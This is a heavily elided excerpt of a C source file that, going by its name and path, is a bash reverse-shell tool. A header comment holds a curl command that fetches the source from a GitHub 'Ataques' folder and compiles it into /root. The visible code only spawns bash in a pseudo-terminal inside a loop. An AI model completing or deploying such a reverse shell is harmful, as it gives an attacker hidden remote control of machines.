//
// curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/BashReversoANetCat2.c > /tmp/BashReversoANetCat2.c; gcc /tmp/BashReversoANetCat2.c -o /root/BashReversoANetCat2
//
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
...
int main() {
    ...
    while (1) {
        ...
        if (pid == 0) {  // Proceso hijo: ejecuta bash con un PTY real
            ...
            setsid(); // Crear nueva sesión para evitar que bash termine
